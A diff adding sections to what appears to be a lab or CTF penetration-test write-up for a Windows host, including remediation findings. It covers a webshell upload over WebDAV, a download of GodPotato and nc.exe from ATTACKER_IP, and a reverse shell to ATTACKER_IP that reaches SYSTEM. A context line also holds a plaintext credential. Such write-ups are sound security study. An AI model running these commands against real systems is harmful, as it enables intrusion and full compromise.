@@ -145,22 +145,144 @@ curl -i -u 'fmcsorley:CrabSharkJellyfish192' -T test.txt http://192.168.199.122/
 
 Resulting in a 201 Created response code.
 
+Cadaver was used with recovered credentials to upload an aspx webshell:
+
+```
+cadaver http://192.168.199.122 
+
+put /usr/share/webshells/aspx/cmdasp.aspx
+```
+
+This resulted in a webshell as user `iis apppool\defaultapppool`.
+
+Hoaxshell was used to make interaction easier:
+
+```
+git clone https://github.com/t3l3machus/hoaxshell
+python3 -m venv hoaxenv
+source hoaxenv/bin/activate
+pip install -r hoaxshell/requirements.txt
+```
+
+This resulted in a low level interactive shell as user `iis apppool\defaultapppool` on `hutchdc`.
+
 ---
 
 ## 7. Post-Exploitation
+
+System enumeration revealed Windows Server 2019 Standard:
+
+```
+systeminfo
+```
+
+And user privileges revealed vulnerable `SeImpersonatePrivilege` enabled:
+
+```
+whoami /priv
+```
 
 ---
 
 ## 8. Privilege Escalation
 
+To exploit the vulnerable `SeImpersonatePrivilege`, GodPotato and nc.exe were uploaded to the target machine:
+
+```
+cd C:\Windows\Temp
+
+iwr -Uri http://ATTACKER_IP/GodPotato-NET4.exe -Outfile godpotato.exe
+
+iwr -Uri http://ATTACKER_IP/nc.exe -Outfile nc.exe
+```
+
+A listener was started on the attacker machine:
+
+```
+nc -lnvp 1337
+```
+
+GodPotato was executed on the target machine:
+
+```
+.\godpotato.exe -cmd "C:\Windows\Temp\nc.exe -e cmd ATTACKER_IP 1337"
+```
+
+SYSTEM shell obtained.
+
 ---
 
 ## 9. Proof of Compromise
+
+**User Flag**: *REDACTED*
+
+```
+type C:\Users\fmcsorley\Desktop\local.txt
+```
+
+**Root Flag**: *REDACTED*
+
+```
+type C:\Users\Administrator\Desktop\proof.txt
+```
+
+This confirms full system compromise.
 
 ---
 
 ## 10. Findings & Recommendations
 
+### **Finding:** Plaintext Password Stored in LDAP Attribute
+
+**Severity:** Critical
+
+**Description:**
+A domain user password was stored in plaintext within an Active Directory attribute (such as the description field), making it accessible to authenticated users.
+
+**Impact:**
+Attackers could retrieve the exposed credential and use it to authenticate as the affected user, potentially leading to privilege escalation or lateral movement.
+
+**Recommendation:**
+Prohibit storage of credentials in Active Directory attributes, implement auditing for sensitive attribute exposure, and perform credential rotation for affected accounts.
+
+### **Finding:** WebDAV Authenticated File Upload Enabled
+
+**Severity:** Critical
+
+**Description:**
+The WebDAV service allowed authenticated users to upload arbitrary files to the IIS web root using the HTTP PUT method.
+
+**Impact:**
+Attackers could upload malicious files and achieve remote code execution on the server.
+
+**Recommendation:**
+Disable WebDAV if not required, restrict the HTTP PUT method, and enforce secure upload directory controls with execution restrictions.
+
+### **Finding:** SeImpersonatePrivilege Assigned to Service Account
+
+**Severity:** Critical
+
+**Description:**
+A service account possessed the SeImpersonatePrivilege privilege, allowing token impersonation attacks.
+
+**Impact:**
+Attackers could exploit token impersonation techniques to escalate privileges to SYSTEM.
+
+**Recommendation:**
+Harden service account privileges, remove unnecessary impersonation rights, apply Microsoft privilege hardening guidance, and monitor for abnormal token impersonation activity.
+
 ---
 
 ## 11. Appendix
+
+cmdasp.aspx Webshell -
+[https://gitlab.com/kalilinux/packages/webshells](https://gitlab.com/kalilinux/packages/webshells)
+
+HoaxShell GitHub -
+[https://github.com/t3l3machus/hoaxshell](https://github.com/t3l3machus/hoaxshell)
+
+GodPotato Net4 GitHub - 
+[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
+
+Nc.exe GitHub -
+[https://github.com/int0x33/nc.exe/](https://github.com/int0x33/nc.exe/)
